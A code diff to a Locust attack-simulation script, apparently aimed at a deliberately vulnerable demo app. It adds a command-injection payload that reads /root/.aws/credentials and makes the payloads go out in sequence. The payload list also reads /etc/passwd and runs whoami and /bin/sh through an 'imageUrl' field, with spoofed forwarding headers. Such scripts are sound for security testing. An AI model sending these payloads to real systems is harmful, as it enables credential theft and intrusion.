@@ -87,6 +87,7 @@ JNDI_URIS = [
 ]
 
 CMDS = [
+    "image.net ; `cat /root/.aws/credentials`",
     "example.com && whoami #",
     "image.com ; /bin/sh echo bar",
     "example-image.net ; `cat /etc/passwd`",
@@ -123,6 +124,10 @@ WAIT_TIME = int(os.environ['WAIT_TIME'])
 class UnguardUser(HttpUser):
     wait_time = between(WAIT_TIME, WAIT_TIME + 20)
 
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+        self.cmd_index = 0
+
     def get_running_username(self):
         global USER_INDEX
         return "hacker_" + str(USER_INDEX)
@@ -150,7 +155,14 @@ class UnguardUser(HttpUser):
         time.sleep(1)
 
     def post_cmd(self):
-        cmd_post = {'imageUrl': random.choice(CMDS)}
+        cmd = random.choice(CMDS)
+
+        # initially, force sequential command execution
+        if self.cmd_index < len(CMDS):
+            cmd = CMDS[self.cmd_index]
+            self.cmd_index += 1
+
+        cmd_post = {'imageUrl': cmd}
         self.client.post("/api/post", json=cmd_post, headers=self.get_random_x_forwarded_for_header())
         time.sleep(1)
 
